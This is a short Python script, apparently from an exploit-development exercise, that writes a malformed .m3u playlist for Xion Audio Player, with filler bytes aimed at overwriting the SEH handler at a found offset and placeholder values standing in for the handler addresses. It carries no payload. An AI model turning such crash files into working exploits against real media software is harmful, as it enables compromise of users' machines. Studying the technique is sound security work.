import struct

total = 5000
fuzz = "A" * 206
fuzz += "BB" #overwrite nSEH
fuzz += "CC" #overwrite SEH
fuzz += "D" * (total-206-2-2) 
filename = "C:\Documents and Settings\yunaranyancat\Desktop\XionAudioPlayer\offset.m3u"

with open(filename, 'w') as outfile:
    outfile.write(fuzz)

